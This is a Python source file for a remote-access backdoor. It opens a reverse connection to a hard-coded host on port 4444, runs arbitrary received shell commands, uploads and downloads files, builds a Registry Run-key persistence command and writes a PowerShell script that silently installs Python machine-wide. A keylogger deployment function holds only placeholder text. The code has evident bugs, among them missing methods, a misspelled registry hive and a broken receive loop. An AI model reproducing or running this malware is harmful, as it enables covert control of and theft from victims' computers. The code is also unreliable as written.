import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            return "Error in executing command"

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json_data
            except ValueError:
                continue

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path


    def write_file(self, filename, content):
        with open(filename,"w") as file:
            file.write(content)
        return "[+] Upload successful"

    def downloadfile(self, filename):
        f = open(filename, "r")
        return f.read()

    def persistent(self, file):
        os.path.abspath(os.getcwd())
        return "reg add HCKU\Software\Microsoft\windows\CurrentVersion\Run /security /t REG_SZ /d"

    def setup():
        with open("download", "w") as setup:
            setup.write(
                '''
[CmdletBinding()] Param(
$pythonVersion = "3.6.2"
$pythonUrl = "https://www.python.org/ftp/python/$pythonVersion/python-$pythonVersion.exe"
$pythonDownloadPath = 'C:\Tools\python-$pythonVersion.exe'
$pythonInstallDir = "C:\Tools\Python$pythonVersion"
)

(New-Object Net.WebClient).DownloadFile($pythonUrl, $pythonDownloadPath)
& $pythonDownloadPath /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 TargetDir=$pythonInstallDir
if ($LASTEXITCODE -ne 0) {
    throw "The python installer at '$pythonDownloadPath' exited with error code '$LASTEXITCODE'"
}
# Set the PATH environment variable for the entire machine (that is, for all users) to include the Python install dir
[Environment]::SetEnvironmentVariable("PATH", "${{env:path}};${{pythonInstallDir}}", "Machine")
                '''
            )

    def deploy_keyLogger(self, filename):
        with open(filename,"w") as file:
            file.write('''
copy keylogger hapa ndani vile iko.
            ''')

    def run(self):
        # touch -t YYYYMMDDhhmm "<file>"
        results = ""
        try:
            command = self.reliable_receive()
            command = command.split(" ")
            print(type(command))
            command[0] = (command[0].split('"')[1])
            print(command[0])
            # new_comm = command[0].split("")
            # new_com.re
            if command[0] == "cd":
                results = self.change_working_directory_to(command[1])
                self.reliable_send(results.decode())
            elif command[0] == "download":
                results = self.downloadfile(command[1])
                self.reliable_send(results.decode())
            elif command[0] == "upload":
                results = self.upload(command[1], command[2])
                self.reliable_send(results.decode())
            elif command[0] == "persist":
                results = self.execute_system_command(self.persistent())
                self.reliable_send(results.decode())
            elif command[0] == "pwd":
                results = self.execute_system_command(os.getcwd())
                self.reliable_send(results.decode())
            elif command[0] == "setup":
                self.setup()
            elif command[0] == "deploy":
                self.deploy_keyLogger(command[1])
            else:
                results = self.execute_system_command(command)
                self.reliable_send(results.decode())
        except:
            result = "[-] Error in command execution"
            self.reliable_send(result)


    # def run(self):
    #     while True:
    #         command = self.reliable_receive()
    #         print(command)
    #         try:
    #             if command[0] == "exit":
    #                 self.connection.close()
    #                 sys.exit()

    #             elif command[0] == "cd" and len(command) > 1:
    #                 command_result = self.change_working_directory_to(command[1])

    #             elif command[0] == "download":
    #                 command_result = self.read_file(command[1])

    #             elif command[0] == "upload":
    #                 command_result = self.write_file(command[1], command[2])

    #             else:
    #                 command_result = self.execute_system_command(command)
    #         except Exception:
    #             command_result = "[-] Error executing command"

    #         self.reliable_send(command_result)


my_backdoor=Backdoor("192.168.0.108",4444)
while True:
    my_backdoor.run()


#connection.send("\n[+]connection established.\n")


